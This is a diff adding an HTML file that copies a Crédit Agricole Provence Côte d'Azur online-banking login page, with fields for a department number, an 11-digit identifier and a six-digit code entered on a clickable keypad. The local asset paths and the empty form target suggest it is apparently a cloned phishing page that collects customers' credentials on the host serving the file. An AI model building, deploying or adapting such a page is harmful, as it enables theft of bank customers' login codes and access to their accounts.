@@ -1,0 +1,703 @@
+<html><head>
+<title>AUTH</title>
+
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+
+<link type="image/gif" rel="icon" href="./img/favicon.gif">
+<link type="image/gif" rel="shortcut icon" href="./img/favicon.gif">
+
+<link rel="stylesheet" type="text/css" href="./img/antiquus.css" media="all">
+<link rel="stylesheet" type="text/css" href="./img/styles.css" media="all">
+<link rel="stylesheet" type="text/css" href="./img/styles-mod.css" media="all">
+<link rel="stylesheet" type="text/css" href="./img/stb.css" media="all">
+
+<script src="./img/infosbulle.js"></script></head><body text="#000000" leftmargin="0" topmargin="0" onload="resetFields()"><div id="infoBull" style="position: absolute;z-Index:10"></div><div id="ombrBull" style="position: absolute;z-Index:9"></div><style type="text/css"></style>
+
+
+
+
+
+
+
+<div id="infoBull" style="position: absolute;z-Index:10"></div>
+<div id="ombrBull" style="position: absolute;z-Index:9"></div>
+
+
+
+
+
+
+<script language="JavaScript">
+<!--
+
+//Message affich&eacute; quand le souris est au-dessus: 
+statusconfirmer="Confirmer l'identification";
+statusannuler="Annuler l'identification";
+statusaide="Besoin d'Aide ?";
+statuscondjur="Conditions juridiques";
+statusdemo="Voir la d&eacute;monstration";
+statuscompte="Saisir votre identifiant &agrave 11 chiffres";
+statuscode="Saisir votre code personnel";
+statuscorriger="Corriger votre dernière saisie";
+statusclavnum="Cliquez dans la grille pour composer votre code personnel";
+statusrecom="Voir nos recommandations";
+
+// on recupere la version du navigateur
+var OS = 'Win';
+// on recupere la version du navigateur
+Version=navigator.appVersion;
+App = navigator.appName;
+var Version=Version.substring(0,1);
+var posOS = navigator.appVersion.indexOf('Mac');
+var posOS2 = navigator.appVersion.indexOf('Win');
+if (posOS >= 0) OS = 'Mac';
+if ((posOS < 0) && (posOS2 >= 0)) OS = 'Win';
+if (OS == 'Win') Nav_sup = 2;
+else Nav_sup = 3;
+// si c'est Netscape 2+ ou MSIE3+, c'est correct
+browserOK=(((navigator.appName=="Netscape") && (Version > 1)) || (Version>=Nav_sup));
+browserOK1=(((navigator.appName=="Netscape") && (Version > 1)) || (Version>=4));
+browserOK2=(navigator.appName=="Netscape");
+
+
+// Detection navigateur
+nsvers = "0.94"; // pour netscape "6.2";
+ievers = "5";
+browserOK = false;
+isIE55 = false;
+var d, na, nua, nav, nan, dom, ie, ienu, ie4, ie5, ie5x, ie6, moz, moznu, ns62, mac, win, old, lin, ie5mac, ie5xwin, op, opnu, op4, op5, op6, op7, konq, saf, saf_num;
+
+//variable initialization
+
+d = document;
+na = navigator;
+nav = na.appVersion;
+nan = na.appName;
+nua = na.userAgent;
+win = ( nav.indexOf( 'Win' ) != -1 );
+mac = ( nav.indexOf( 'Mac' ) != -1 );
+lin = ( nav.indexOf( 'Linux' ) != -1 );
+
+if ( !d.layers ){
+	dom = ( d.getElementById );
+	old = ( nav.substring( 0, 1 ) < 4 );
+	op = ( nua.indexOf( 'Opera' ) != -1 );
+	moz = ( nua.indexOf( 'Gecko' ) != -1 );
+	ie = ( d.all && !op );
+	konq = ( nua.indexOf( 'Konqueror' ) != -1 );
+	saf = ( nua.indexOf( 'Safari' ) != -1 );
+
+	if ( op ){
+		op_pos = nua.indexOf( 'Opera' );
+		opnu = nua.substr( ( op_pos + 6 ), 3 );
+		op5 = ( opnu.substring( 0, 1 ) == 5 );
+		op6 = ( opnu.substring( 0, 1 ) == 6 );
+		op7 = ( opnu.substring( 0, 1 ) == 7 );
+	}
+	else if ( saf ){
+		saf_pos = nua.indexOf( 'Safari' );
+		saf_nu = nua.substr( ( saf_pos + 7 ), 2 );
+	}
+	else if ( moz ){
+		rv_pos = nua.indexOf( 'rv' );
+		moz_rv = nua.substr( ( rv_pos + 3 ), 3 );
+		moz_rv_sub = nua.substr( ( rv_pos + 7 ), 1 );
+		moz_rv_sub = moz_rv + moz_rv_sub;
+		browserOK = (moz_rv_sub >= nsvers);
+	}
+	else if ( ie ){
+		ie_pos = nua.indexOf( 'MSIE' );
+		ienu = nua.substr( ( ie_pos + 5 ), 3 );
+		ie4 = ( !dom ); 
+		ie5 = ( ienu.substring( 0, 1 ) == 5 );
+		ie6 = ( ienu.substring( 0, 1 ) == 6 );
+		browserOK = ( ienu.substring( 0, 1 ) >= ievers );
+	}
+	else{} 
+
+	ie5x = ( d.all && dom );
+	isIE55 = ie5x;
+	ie5mac = ( mac && ie5 );
+	ie5xwin = ( win && ie5x );
+}
+
+
+ns4=(document.layers)? true:false;
+ie4=(document.all)? true:false;
+
+function pressKey (e) {
+/*
+        if (ns4) {var nKey=e.which; var ieKey=0}
+        if (ie4) {var ieKey=event.keyCode; var nKey=0}
+        if (nKey==13 || ieKey==13) {
+				validation(document.formulaire);
+                return true;
+        }
+*/
+}
+
+function setSize(win,width,height) {
+	if (win.outerWidth) {
+		win.outerWidth = width;
+		win.outerHeight = height;
+	}
+	else if (win.resizeTo) {
+		win.resizeTo(width,height);
+	}
+	else {
+		alert("Not supported.");
+	}
+}
+
+function clicPosition(position) {
+	cocherCase();
+	if (document.formulaire.CCCRYC2.value.length == 6) { 
+		return; 
+	}
+	if (document.formulaire.CCCRYC.value=="") 
+		document.formulaire.CCCRYC.value = position;
+	else
+		document.formulaire.CCCRYC.value = document.formulaire.CCCRYC.value + "," + position;
+	document.formulaire.CCCRYC2.value = document.formulaire.CCCRYC2.value + "0";
+}
+
+var code, pos_der_code, affiche_code;
+function effacer() { 
+	if (document.formulaire.CCCRYC2.value.length == 0) { 
+		return; 
+	}
+	code = document.formulaire.CCCRYC.value;
+	pos_der_code = code.lastIndexOf( ',' );
+	code = code.substr( 0,pos_der_code);
+
+	affiche_code = document.formulaire.CCCRYC2.value;
+	affiche_code = affiche_code.substr( 0,(document.formulaire.CCCRYC2.value.length - 1) );
+
+	document.formulaire.CCCRYC.value = code;
+	document.formulaire.CCCRYC2.value = affiche_code;
+}
+
+var iPositionCurseurPastillesBAM_Authent=0;
+function cocherCase() {
+	if ( iPositionCurseurPastillesBAM_Authent<6)
+	{
+		var l_oBarre = document.getElementById("monAvancement");
+		l_oBarre.rows[0].cells[iPositionCurseurPastillesBAM_Authent].style.visibility = 'visible';
+		iPositionCurseurPastillesBAM_Authent = iPositionCurseurPastillesBAM_Authent + 1;
+	}
+}
+function corriger() {
+	if ( iPositionCurseurPastillesBAM_Authent>0 )
+	{
+		iPositionCurseurPastillesBAM_Authent = iPositionCurseurPastillesBAM_Authent - 1;
+		var l_oBarre = document.getElementById("monAvancement");
+		l_oBarre.rows[0].cells[iPositionCurseurPastillesBAM_Authent].style.visibility = 'hidden';
+	 }
+}
+
+var path_static = "";
+var path_dynamic = "/stb";
+// Recuperation code caisse
+var caisse = "891";
+
+function raf(){
+	return;
+}
+
+var urlappli = "";
+var urlapplisecu = "/stb/securite-entreeBam?TOPAF=1";
+
+function ValidCertif(){
+	document.formulaire.action = urlappli;
+	if(!validation(document.formulaire)) return;
+	document.formulaire.submit();
+
+}
+
+function ValidCertifSecu(){
+	document.formulaire.action = urlapplisecu;
+	validation(document.formulaire)
+}
+
+function hidePersoCode() {
+	
+	var i;
+	for(i=0;i<6;i++)
+	{
+		var l_oBarre = document.getElementById("monAvancement");
+		l_oBarre.rows[0].cells[i].style.visibility = 'hidden';
+	 }
+	 iPositionCurseurPastillesBAM_Authent = 0;
+}
+
+function resetFields()
+{
+	document.formulaire.DEPART.value = "";
+	document.formulaire.CCPTE.value = "";
+	document.formulaire.CCCRYC.value = "";
+	document.formulaire.CCCRYC2.value = "";
+	hidePersoCode();
+}
+
+// -->
+</script>
+
+<script language="JavaScript">
+<!--
+
+function ouvrePOPUP(item,widthpop,heightpop,men) {
+	if(item.indexOf("?") != -1) {
+		item = item+"&stbevt=Popup";
+	}
+	else {
+		item = item+"?stbevt=Popup";
+	}
+
+	ouvreFenetre(item,widthpop,heightpop,men,"PopUp");
+}
+function ouvreassistance(item,widthpop,heightpop,men) {
+	ouvreFenetre(item,widthpop,heightpop,men,"Assistance");
+}
+
+function ouvreFenetre(item,widthpop,heightpop,men,titre) {
+
+	if (item.indexOf("?") != -1) {
+		if (item.indexOf("#") != -1)
+			url = item.substring(0,item.indexOf("#"))+"&typeaction=Popup"+item.substring(item.indexOf("#"),item.length);
+		else
+			url = item+"&typeaction=Popup";
+	} else {
+		url = item;
+	}
+
+	aazz = "menubar=" + men + ",resizable=yes,toolbar=no,width=" + widthpop + ",height=" + heightpop + ",scrollbars=yes";
+
+	// on verifie si l'on n'est pas deja sur la bonne fenetre
+	if (titre!=window.name) {
+		// Mise en commentaire de l ancien code
+		//if (!saf) {
+			// on recupere un reference sur le popup (s'il n'est pas ouvert, cela en ouvre une!)
+		//	popup1 = window.open('',titre,aazz);
+			// on ferme le popup
+		//	popup1.close();
+		//}
+		// on ouvre le nouveau avec les nouveaux parametres (taille, bouton...)
+		//popup1 = window.open('',titre,aazz);
+		//popup1.name = titre;
+		//setSize(popup1,widthpop,heightpop);
+			
+		popup1 = window.open(url,titre,aazz);
+			
+	    if (moz ) popup1.focus();
+	    //popup1.location =url;
+	} else {
+		window.name = titre;
+		setSize(window,widthpop,heightpop);
+		document.location = url;
+	}
+
+}
+
+function setSize(win,width,height) {
+	if (win.outerWidth) {
+		win.outerWidth = width;
+		win.outerHeight = height;
+	}
+	else if (win.resizeTo) {
+		win.resizeTo(width,height);
+	}
+	else {
+		alert("Not supported.");
+	}
+}
+
+//ouvre une fenêtre popup en plein &eacute;cran ne laissant l'affichage que de la bnt
+function ouvrirPopupBntVisible(url) {
+	window.open(url,'Popup','location=no,toolbar=no,directories=no,menubar=yes,resizable=yes,scrollbars=yes,status=yes,width='+(screen.availWidth-140)+',height='+screen.availHeight+',screenY=0,screenX='+140);
+}
+
+// -->
+</script>
+
+
+<div id="container">
+							<div id="contenu" style="width: 957px;">
+<table border="0">
+	<tbody><tr>
+		<td colspan="3">
+
+
+<div align="center" style="background-color:#E6E6E6;">
+<table width="620px" cellspacing="0" cellpadding="0" border="0">
+<tbody><tr>
+<td style="background:#E6E6E6;">
+	<div id="entete_vide">	
+		<div id="entete_2" style="background:none;">
+   			 <div id="gauche-entete_con_2">
+		        <h1 style=" border: 0">
+					<table>
+						<tbody><tr>
+							<td>
+								<a title="Caisse Régionale Provence Côte d'Azur, retour à l'accueil" href="#" id="lien-logo_2">
+									<img alt="Caisse Régionale Provence Côte d'Azur, retour à l'accueil" src="./img/526614logo878.png">
+								</a>
+							</td>
+						</tr>
+					</tbody></table>
+		        </h1>
+<!--		        <p id="slogan_2"></p>-->
+		    </div>
+   		 </div>
+	</div>
+</td>
+</tr>
+</tbody></table>
+</div>
+		</td>
+	</tr>
+	<tr valign="top">
+	
+		<td>
+		
+		<table style="background:#00000" border="0" width="100%" cellpadding="0" cellspacing="0">
+
+			<tbody><tr>
+				<td valign="top" width="169" style="background:#E6E6E6 repeat-y scroll left top">&nbsp;</td>
+				<td id="col-centre" valign="top" width="590px">
+				
+				<table width="590" border="0" cellspacing="0" cellpadding="0">
+					<tbody><tr>
+						<td>
+						
+						<table width="590" border="0" cellspacing="0" cellpadding="0">
+							
+							<tbody><tr>
+								<td colspan="2" class="montant2">&nbsp;</td>
+							</tr>
+							
+							<tr>
+								<td colspan="2" height="17"></td>
+							</tr>
+							<!-- bandeau authentification --> <tr><td colspan="2" align="center"><a href="javascript:ouvrePOPUP('https://www.ca-pca.fr/Vitrine/ObjCommun/Fic/PCA/idt_bam/redirection.html',790,455,'no','AUTH');"> <img src="./img/Idt_Bam_Promo.jpg" border="no"></a></td></tr> <tr><td>&nbsp;</td></tr>    
+							<tr>
+								<td height="17"><div class="boutons-act">
+                    <h1>
+                        Identification
+                   <span id="top-actions">
+								<a id="top-actions-aide" href="javascript:ouvreassistance('https://www.pca-g3-enligne.credit-agricole.fr/stb/app/bam/tech/allmedia/stb/entreebam/jsp/AUTH-AID.jsp',500,480,'no','AUTH')" onmouseout="StatusMessage( false )" onmouseover="StatusMessage(true, statusaide);return true" tabindex="32">Aide</a></span></h1>
+</div></td>
+							</tr>
+						</tbody></table>
+						<form class="ca-forms ca-forms-stitre" method="POST" name="formulaire" action="/stb/entreeBam" onsubmit="return false;">
+							<input type="hidden" name="idtcm" value=""> 
+							<input type="hidden" name="tracking" value="O"> 
+							<input type="hidden" name="origine" value="vitrine"> 
+							<input type="hidden" name="situationTravail" value="BANCAIRE"> 
+							<input type="hidden" name="canal" value="WEB"> 
+							<input type="hidden" name="typeAuthentification" value="CLIC_RETOUR">
+							<input type="hidden" name="idUnique" value="5b13a00d:158eb0c3c00:-6627"> 
+							<input type="hidden" name="caisse" value="891"> 
+							<input type="hidden" name="CCCRYC" value="">
+						<fieldset class="blc-choix"><div class="blc-choix-wrap" style="padding-bottom: 40px;"><p class="nomarge">    <b>Le Crédit Agricole accorde une grande attention à la sécurité de ses sites    internet.</b> En tant qu'utilisateur vous avez également un rôle important    et actif à jouer pour assurer la sécurité des informations qui vous concernent.    Consultez ci-dessous les REGLES de SECURITE à respecter:    </p><div align="right"></div><p></p><p class="validation" style="width:570px"><a class="retour gauche" href="javascript:ouvrePOPUP('https://www.ca-pca.fr/site-securite.html',790,455,'no','AUTH');" tabindex="33">Nos recommandations</a></p></div></fieldset>
+						<table width="590" border="0">
+							<!-- Message securitaire -->
+
+							<tbody><tr>
+								<td height="22" colspan="3">
+								<input type="hidden" name="CCCRYC2" value="">
+								 <fieldset class="blc-choix">
+							 <script>
+								if(saf){
+									document.write("<div class=\"blc-choix-wrap\" style=\"padding-bottom:190px;\">");
+									
+								}else{
+									document.write("<div class=\"blc-choix-wrap\">");
+								}
+							   
+							</script><div class="blc-choix-wrap" style="padding-bottom:190px;">
+								<script langage="Javascript">
+<!--
+
+function validation(formulaire) {
+
+	var depMatch = /^\d{2}$/;
+	var identMatch = /^\d{11}$/;
+	
+	if(formulaire.DEPART.value=="") {
+		alert("Votre numéro de département est incomplet.");
+		return false;
+	}
+	else if(!depMatch.test(formulaire.DEPART.value)) {
+		alert("Votre numéro de département est invalid.");
+		return false;
+	}
+
+	if(formulaire.CCPTE.value=="") {
+		alert("Votre identifiant est incomplet.");
+		return false;
+	}
+	else if(!identMatch.test(formulaire.CCPTE.value)) {
+		alert("Votre identifiant est invalid.");
+		return false;
+	}
+
+	if(formulaire.CCCRYC.value=="") {
+		alert("Votre code personnel est incomplet.");
+		return false;
+	}
+	else if(formulaire.CCCRYC2.value.length != 6) {
+		alert("Votre code personnel est invalid.");
+		return false;
+	}
+
+	return true;
+
+}
+
+function isNumerique(chaine){
+if (chaine.length!=6)
+return false;
+for(var i=0;i<chaine.length;i++){
+if(chaine.charAt(i)>'9' || chaine.charAt(i)<'0'){
+return false;
+}
+}
+return true;
+}
+function isAlphaNum(chaine){
+if (chaine.length!=11)
+return false;
+chaine = chaine.toLowerCase();
+for(var i=0;i<chaine.length;i++){
+if(!((chaine.charAt(i)<='9' && chaine.charAt(i)>='0') || (chaine.charAt(i)<='z' && chaine.charAt(i)>='a'))){
+return false;
+}
+}
+return true;
+}
+
+
+function cancelInput() {
+
+
+if(document.formulaire.DEPART.value == "" && document.formulaire.CCPTE.value == "" && document.formulaire.CCCRYC.value == "")
+return;
+
+var r = confirm("Etes-vous sur de vouloir annuler votre saisie ?");
+if(r) resetFields();
+
+}
+-->
+</script>
+<h3>Vos codes d'accès</h3>
+<table>
+<tbody><tr>
+	<td>
+	<label class="normal">Saisissez un numéro de département à l'aide de votre clavier :</label>
+	</td>
+	<td>
+	<input name="DEPART" size="8" maxlength="2" tabindex="1" type="text">
+	</td>
+
+</tr>
+
+<tr>
+<td>
+<p></p>
+</td>
+</tr>
+
+<tr>
+	<td>
+	<label class="normal">Saisissez  votre identifiant à 11 chiffres à l'aide de votre clavier :</label>
+	</td>
+	<td>
+	<input name="CCPTE" size="17" maxlength="11" tabindex="1" type="text">
+	</td>
+</tr>
+
+</tbody></table>
+
+<p></p>
+<div id="bloc-pave-saisis-code">
+<label class="normal gauche" for="input-code">Cliquez dans la grille <br>pour composer votre CODE PERSONNEL :</label>
+
+								
+								
+								<table id="pave-saisie-code" class="gauche">
+<tbody><tr valign="middle" align="center">
+<td><a tabindex="2" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td><a tabindex="3" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td onclick="clicPosition('4'); "><a tabindex="4" href="javascript:raf()">
+&nbsp;&nbsp;4&nbsp;&nbsp;
+</a></td>
+<td onclick="clicPosition('3'); "><a tabindex="5" href="javascript:raf()">
+&nbsp;&nbsp;3&nbsp;&nbsp;
+</a></td>
+<td><a tabindex="6" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+</tr>
+<tr valign="middle" align="center">
+<td onclick="clicPosition('2'); "><a tabindex="7" href="javascript:raf()">
+&nbsp;&nbsp;2&nbsp;&nbsp;
+</a></td>
+<td><a tabindex="8" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td onclick="clicPosition('6'); "><a tabindex="9" href="javascript:raf()">
+&nbsp;&nbsp;6&nbsp;&nbsp;
+</a></td>
+<td><a tabindex="10" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td><a tabindex="11" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+</tr>
+<tr valign="middle" align="center">
+<td onclick="clicPosition('1'); "><a tabindex="12" href="javascript:raf()">
+&nbsp;&nbsp;1&nbsp;&nbsp;
+</a></td>
+<td><a tabindex="13" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td><a tabindex="14" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td onclick="clicPosition('0'); "><a tabindex="15" href="javascript:raf()">
+&nbsp;&nbsp;0&nbsp;&nbsp;
+</a></td>
+<td><a tabindex="16" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+</tr>
+<tr valign="middle" align="center">
+<td><a tabindex="17" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td onclick="clicPosition('7'); "><a tabindex="18" href="javascript:raf()">
+&nbsp;&nbsp;7&nbsp;&nbsp;
+</a></td>
+<td><a tabindex="19" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td><a tabindex="20" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td onclick="clicPosition('9'); "><a tabindex="21" href="javascript:raf()">
+&nbsp;&nbsp;9&nbsp;&nbsp;
+</a></td>
+</tr>
+<tr valign="middle" align="center">
+<td><a tabindex="22" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td onclick="clicPosition('8'); "><a tabindex="23" href="javascript:raf()">
+&nbsp;&nbsp;8&nbsp;&nbsp;
+</a></td>
+<td><a tabindex="24" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td onclick="clicPosition('5'); "><a tabindex="25" href="javascript:raf()">
+&nbsp;&nbsp;5&nbsp;&nbsp;
+</a></td>
+<td><a tabindex="26" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+</tr>
+</tbody></table>
+
+<span class="align-bas gauche">
+								<table>
+								<tbody><tr>
+								<td>
+								<div style="border-color: gray;border-width: 1px;border-style: solid;">
+								<table id="monAvancement" class="monAvancement" style="border:none;">
+											<tbody><tr>
+												<td class="maCase" style="visibility: hidden;"><img src="./img/point_transp.gif" height="10" width="10"></td>
+												<td class="maCase" style="visibility: hidden;"><img src="./img/point_transp.gif" height="10" width="10"></td>
+												<td class="maCase" style="visibility: hidden;"><img src="./img/point_transp.gif" height="10" width="10"></td>
+												<td class="maCase" style="visibility: hidden;"><img src="./img/point_transp.gif" height="10" width="10"></td>
+												<td class="maCase" style="visibility: hidden;"><img src="./img/point_transp.gif" height="10" width="10"></td>
+												<td class="maCase" style="visibility: hidden;"><img src="./img/point_transp.gif" height="10" width="10"></td>
+											
+											</tr>
+										</tbody></table>
+								</div>
+										</td>
+										<td>
+										(6 chiffres)
+										</td>
+										</tr>
+										</tbody></table>
+								
+                                </span>
+                                
+							</div>
+							
+							<p class=" validation clearboth" style="width:570px;margin:30px 0 0;">
+                                <span class="gauche">
+	                                <a class="retour gauche" href="javascript:ouvrePOPUP('http://www.ca-pca.fr/Vitrine/ObjCommun/Fic/PCA/demo/index.html',1024,587,'no','AUTH');" tabindex="31">Voir la démonstration</a>
+                            	</span>
+                            	<span class="droite">
+                            	
+                            	
+                            		
+	                            		
+			   							
+			   							
+			   						
+
+			   							
+			   							
+			   						
+			   							
+			   							
+			   						
+	                            		<a class="annuler droite" href="javascript:corriger();effacer();" id="corr" tabindex="27">Corriger</a> 
+		   				<a class="droite" href="javascript:ValidCertif();" id="conf" tabindex="28">Confirmer</a>
+	                            		<a class="annuler droite" onclick="cancelInput();" id="annu" tabindex="30">Annuler</a>
+	                            		
+			   							
+
+			   							
+			   							
+			   							
+			   							
+								</span>                           
+                            </p>
+						</div>
+                   		 </fieldset>
+										
+								</td>
+							</tr>
+							
+						</tbody></table>
+						
+						</form></td>
+					</tr>
+		<tr>
+		<td>		
+		<!-- Pav&eacute; Certificat --> 
+		
+		<!-- Conditions Juridique --> <form class="ca-forms" style="padding:0 0;"><p>Vous avez perdu votre code confidentiel <a href="javascript:ouvrePOPUP('https://www.ca-pca.fr/Formulaires/Vitrine/p-88791.jsp',490,450,yesno,authentif);"><font color="#0000ff">cliquez ici</font></a></p><br><p>Je reconnais avoir pris connaissance et accepté les conditions juridiques de la convention d'utilisation du service.</p><p class="validation" style="width:580px"><script>var srcLien = "https://www.pca-g3-enligne.credit-agricole.fr/stb/app/bam/tech/allmedia/stb/entreebam/jsp/AUTH-INF.jsp?stbevt=Popup&typeaction=Popup";var srcPuceLien = path_static + "./img/PuceLien.gif";var yesno = "no";var authentif = "AUTH";</script><a class="retour gauche" href="javascript:ouvrePOPUP(srcLien,490,450,yesno,authentif);" tabindex="34">Conditions juridiques</a></p></form>
+			</td>
+		</tr>
+		</tbody></table>
+		</td>
+		<td valign="top" width="171" style="background:#E6E6E6 repeat-y scroll left top">&nbsp;</td>
+		</tr>
+		
+		
+	<tr valign="middle" style="background-color:#E6E6E6;">
+	<td></td>
+		<td>
+		<table border="0" cellpadding="0" cellspacing="0" width="590">
+			<tbody><tr>
+				<td class="footercopyright" align="center">&nbsp;</td>
+			</tr>
+			<tr>
+				<td class="footercopyright" align="center">&nbsp;</td>
+			</tr>
+		</tbody></table>
+		
+		</td>
+		<td></td>
+	</tr></tbody></table>
+</td>
+
+
+
+</tr>
+</tbody></table>
+
+
+
+
+<table>
+	<tbody><tr>
+		<td width="169"></td>
+		<td id="main_bas" width="570"></td>
+		<td width="169"></td>
+	</tr>
+</tbody></table>
+</div>
+</div>
+
+
+</body></html>
